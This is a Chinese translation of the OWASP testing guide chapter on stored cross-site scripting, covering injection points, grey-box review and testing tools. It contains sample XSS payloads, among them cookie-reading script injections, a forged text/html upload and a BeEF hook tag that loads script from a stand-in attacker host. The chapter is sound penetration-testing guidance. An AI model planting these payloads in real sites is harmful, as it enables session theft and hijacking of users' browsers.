# 测试存储型跨站脚本

|ID          |
|------------|
|WSTG-INPV-02|

## 概述

存储型[跨站脚本（XSS）](https://owasp.org/www-community/attacks/xss/)是最危险的跨站脚本类型。允许用户存储数据的Web应用程序可能容易受到此类攻击。本章说明了存储型跨站脚本注入和相关利用场景的示例。

当Web应用程序收集用户输入（可能是恶意的）然后将该输入存储在数据存储中供以后使用时，就会发生存储型XSS。存储的输入没有被正确过滤。因此，恶意数据将作为站点的一部分出现，并在用户浏览器的Web应用程序权限下运行。由于此漏洞通常至少需要两个对应用程序的请求，这也称为二阶XSS。

此漏洞可用于进行多种浏览器攻击，包括：

- 劫持另一个用户的浏览器
- 捕获应用程序用户查看的敏感信息
- 伪装的应用程序
- 内部主机端口扫描（"内部"是相对于Web应用程序用户而言）
- 浏览器攻击的定向传递
- 其他恶意活动

存储型XSS不需要恶意链接即可被利用。当用户访问带有存储型XSS的页面时，攻击就会成功。以下阶段与典型存储型XSS攻击场景相关：

- 攻击者将恶意代码存储到易受攻击的页面
- 用户在应用程序中进行身份验证
- 用户访问易受攻击的页面
- 恶意代码由用户的浏览器执行

此类攻击也可以使用浏览器利用框架（如[BeEF](https://beefproject.com)和[XSS Proxy](https://xss-proxy.sourceforge.net/)）进行利用。这些框架允许复杂的JavaScript利用开发。

存储型XSS在用户具有高权限访问的应用程序区域中特别危险。当管理员访问易受攻击的页面时，攻击会自动由其浏览器执行。这可能暴露敏感信息，如会话授权令牌。

## 测试目标

- 识别在客户端反映的存储输入。
- 评估它们接受的输入以及返回时应用的编码（如果有）。

## 如何测试

### 黑盒测试

识别存储型XSS漏洞的过程与[测试反射型XSS](01-Testing_for_Reflected_Cross_Site_Scripting.md)期间描述的过程类似。

#### 输入表单

第一步是识别所有将用户输入存储到后端然后由应用程序显示的入口点。存储型用户输入的典型示例可以在以下位置找到：

- 用户/个人资料页面：应用程序允许用户编辑/更改个人资料详细信息，如名、姓、昵称、头像、图片、地址等。
- 购物车：应用程序允许用户将商品存储在购物车中，以后可以查看
- 文件管理器：允许上传文件的应用程序
- 应用程序设置/偏好设置：允许用户设置偏好的应用程序
- 论坛/留言板：允许用户之间交换帖子的应用程序
- 博客：如果博客应用程序允许用户提交评论
- 日志：如果应用程序将某些用户输入存储到日志中。

#### 分析HTML代码

应用程序存储的输入通常用于HTML标签中，但也可以作为JavaScript内容的一部分找到。在这一阶段，必须了解输入是否被存储以及它如何在页面上下文中定位。与反射型XSS不同，渗透测试人员还应调查应用程序接收和存储用户输入的任何带外通道。

**注意**：应对管理员可访问的所有应用程序区域进行测试，以识别用户提交的任何数据的存在。

**示例**：`index2.php`中存储的电子邮件数据：

![存储输入示例](images/Stored_input_example.jpg)\
*图4.7.2-1：存储输入示例*

index2.php中电子邮件值所在的HTML代码：

```html
<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com" />
```

在这种情况下，测试人员需要找到一种方法在`<input>`标签之外注入代码，如下所示：

```html
<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"> MALICIOUS CODE <!-- />
```

#### 测试存储型XSS

这涉及测试应用程序的输入验证和过滤控件。基本注入示例：

- `aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;`
- `aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E`

确保通过应用程序提交输入。这通常涉及禁用JavaScript（如果实施了客户端安全控制）或使用Web代理修改HTTP请求。同时测试相同注入与HTTP GET和POST请求。上述注入结果是一个弹出窗口，其中包含cookie值。

> ![存储型XSS示例](images/Stored_xss_example.jpg)\
> *图4.7.2-2：存储输入示例*
>
> 注入后的HTML代码：
>
> ```html
> <input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"><script>alert(document.cookie)</script>
> ```
>
> 输入被存储，当重新加载页面时，XSS payload由浏览器执行。如果输入被应用程序转义，测试人员应测试应用程序的XSS过滤器。例如，如果字符串"SCRIPT"被替换为空格或空字符，则可能是XSS过滤在起作用。有许多技术可以绕过输入过滤器（请参阅[测试反射型XSS](01-Testing_for_Reflected_Cross_Site_Scripting.md)章节）。强烈建议测试人员参考[XSS过滤器绕过](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)和[Marion](https://cybersecurity.wtf/encoder/) XSS Cheat页面，它们提供了大量XSS攻击和过滤绕过的列表。请参阅白皮书和工具部分以获取更多详细信息。

#### 利用BeEF进行存储型XSS

存储型XSS可以通过[BeEF](https://www.beefproject.com)和[XSS Proxy](https://xss-proxy.sourceforge.net/)等高级JavaScript利用框架进行利用。

典型的BeEF利用场景涉及：

- 注入一个与攻击者的浏览器利用框架（BeEF）通信的JavaScript hook
- 等待应用程序用户查看显示存储输入的易受攻击页面
- 通过BeEF控制台控制应用程序用户的浏览器

JavaScript hook可以通过利用Web应用程序中的XSS漏洞来注入。

**示例**：`index2.php`中的BeEF注入：

```html
aaa@aa.com"><script src=https://attackersite/hook.js></script>
```

当用户加载页面`index2.php`时，脚本`hook.js`由浏览器执行。然后可以访问cookie、用户截图、用户剪贴板，并发起复杂的XSS攻击。

> ![Beef注入示例](images/RubyBeef.png)\
> *图4.7.2-3：Beef注入示例*
>
> 此攻击在许多具有不同权限的用户查看的易受攻击页面上特别有效。

#### 文件上传

如果Web应用程序允许文件上传，请检查是否可以上传HTML内容。例如，如果允许HTML或TXT文件，则可以在上传的文件中注入XSS payload。渗透测试人员还应验证文件上传是否允许设置任意MIME类型。

考虑以下HTTP POST文件上传请求：

```http
POST /fileupload.aspx HTTP/1.1
[…]
Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.txt"
Content-Type: text/plain

test
```

这种设计缺陷可能在浏览器MIME处理攻击中被利用。例如，JPG和GIF等无害文件可能包含XSS payload，当在浏览器中加载时会执行。当图像的MIME类型（如`image/gif`）可以设置为`text/html`时，就会发生这种情况。在这种情况下，文件将被客户端浏览器视为HTML。

伪造的HTTP POST请求：

```html
Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.gif"
Content-Type: text/html

<script>alert(document.cookie)</script>
```

还需要注意的是，Internet Explorer处理MIME类型的方式与Mozilla Firefox或其他浏览器不同。例如，Internet Explorer将带有HTML内容的TXT文件作为HTML内容处理。有关MIME处理的更多信息，请参阅本章末尾的白皮书部分。

### 盲跨站脚本

盲跨站脚本是存储型XSS的一种形式。当攻击者的payload保存在服务器/基础设施上，然后从后端应用程序反映给受害者时，通常会发生这种情况。例如在反馈表中，攻击者可以使用表单提交恶意payload，一旦后端用户/管理员通过后端应用程序查看攻击者的提交内容，攻击者的payload就会被执行。盲跨站脚本在现实世界中很难确认，但最好的工具之一是[XSS Hunter](https://xsshunter.com/)。

> 注意：测试人员在执行安全测试时，应仔细考虑使用公共或第三方服务的隐私影响。（请参阅#tools。）

### 灰盒测试

灰盒测试类似于黑盒测试。在灰盒测试中，渗透测试人员具有应用程序的部分知识。在这种情况下，关于用户输入、输入验证控件和数据存储的信息可能已被渗透测试人员所知。

根据可用的信息，通常建议测试人员检查用户输入如何被应用程序处理，然后存储到后端系统。建议执行以下步骤：

- 使用特殊/无效字符输入前端应用程序
- 分析应用程序响应
- 识别输入验证控件的存在
- 访问后端系统并检查输入是否被存储以及如何存储
- 分析源代码并了解存储的输入如何被应用程序呈现

如果有源代码可用（如同白盒测试），则应分析输入表单中使用的所有变量。特别是在PHP、ASP和JSP等编程语言中，使用预定义变量/函数来存储来自HTTP GET和POST请求的输入。

下表总结了在分析源代码时要查找的一些特殊变量和函数：

| **PHP**        | **ASP**           |  **JSP**         |
|----------------|-------------------|------------------|
| `$_GET` - HTTP GET变量  | `Request.QueryString` - HTTP GET | `doGet`, `doPost` servlet - HTTP GET和POST |
| `$_POST` - HTTP POST变量| `Request.Form` - HTTP POST | `request.getParameter` - HTTP GET/POST变量 |
| `$_REQUEST` – HTTP POST、GET和COOKIE变量 | `Server.CreateObject` - 用于上传文件 | |
| `$_FILES` - HTTP文件上传变量 | | |

**注意**：上表只是最重要参数的摘要，但应调查所有用户输入参数。

## 工具

- [PHP字符编码器(PCE)](https://cybersecurity.wtf/encoder/)帮助您将任意文本编码为65种字符集，并可用于自定义payload。
- [Hackvertor](https://hackvertor.co.uk/public)是一个在线工具，允许对JavaScript（或任何字符串输入）进行多种类型的编码和混淆。
- [BeEF](https://www.beefproject.com)是浏览器利用框架。一个展示浏览器漏洞实时影响的专业工具。
- [XSS-Proxy](https://xss-proxy.sourceforge.net/)是一种高级跨站脚本（XSS）攻击工具。
- [Burp Proxy](https://portswigger.net/burp/)是一个用于攻击和测试Web应用程序的交互式HTTP/S代理服务器。
- [XSS助手](https://www.greasespot.net/)Greasemonkey脚本，允许用户轻松测试任何Web应用程序的跨站脚本漏洞。
- [Zed攻击代理(ZAP)](https://www.zaproxy.org)是一个用于攻击和测试Web应用程序的交互式HTTP/S代理服务器，内置扫描仪。
- [XSS猎人便携版](https://github.com/mandatoryprogrammer/xsshunter)XSS Hunter可以发现各种跨站脚本漏洞，包括经常被忽略的盲XSS。

## 参考资料

### OWASP资源

- [XSS过滤器绕过速查表](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

### 书籍

- Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web Applications"，第二版，McGraw-Hill，2006 - ISBN 0-07-226229-0
- Dafydd Stuttard, Marcus Pinto - "Web Application Handbook - 发现和利用安全漏洞"，2008，Wiley，ISBN 978-0-470-17077-9
- Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager, Seth Fogie - "跨站脚本攻击：XSS利用与防御"，2007，Syngress，ISBN-10: 1-59749-154-3

### 白皮书

- [CERT："CERT咨询CA-2000-02客户端Web请求中嵌入的恶意HTML标签"](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)
- [Amit Klein："跨站脚本解释"](https://courses.csail.mit.edu/6.857/2009/handouts/css-explained.pdf)
- [CGISecurity.com："跨站脚本常见问题解答"](https://www.cgisecurity.com/xss-faq.html)
